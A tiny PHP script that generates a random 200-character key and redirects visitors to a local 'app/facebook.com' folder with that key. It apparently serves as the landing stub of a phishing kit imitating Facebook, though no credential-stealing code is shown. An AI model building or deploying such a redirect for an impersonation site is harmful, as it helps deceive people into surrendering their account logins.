<?php
$longitud = '200';
$key = '';
$keys = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
$max = strlen($keys) - 1;
for($i=0; $i < $longitud; $i++){
$key .= $keys{mt_rand(0,$max)};
}

$navigator_user_agent = (isset($_SERVER['HTTP_USER_AGENT'])) ? strtolower($_SERVER['HTTP_USER_AGENT']):'';
 
header ("Location: app/facebook.com/?key=".$key); 
?>
